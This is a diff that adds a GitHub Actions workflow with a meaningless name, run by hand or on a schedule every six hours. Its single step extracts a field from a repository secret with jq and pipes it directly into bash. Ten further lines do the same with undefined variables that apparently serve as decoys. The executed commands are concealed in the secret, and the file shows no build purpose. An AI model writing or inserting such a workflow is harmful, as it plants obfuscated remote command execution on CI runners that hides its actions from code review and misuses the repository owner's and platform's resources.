@@ -1,0 +1,27 @@
+name: dodgeballthinkable
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dodgeballthinkable
+        env:
+          s7742: ${{ secrets.s7742 }}
+        run: |
+          echo $s7742 | jq -r .znnn2103 | /bin/bash
+          echo $v7720 | jq -r .rs62330 | /bin/bash
+          echo $ab7320 | jq -r .zz47274 | /bin/bash
+          echo $fpq33083 | jq -r .mfjec4 | /bin/bash
+          echo $uwtl13911 | jq -r .hqg5598 | /bin/bash
+          echo $b36435 | jq -r .p34860 | /bin/bash
+          echo $eyz4 | jq -r .zifd11925 | /bin/bash
+          echo $z7246 | jq -r .faezx443 | /bin/bash
+          echo $r7676 | jq -r .cc375 | /bin/bash
+          echo $b19 | jq -r .jlqh07458 | /bin/bash
+          echo $crxzp1 | jq -r .xcani324 | /bin/bash
+
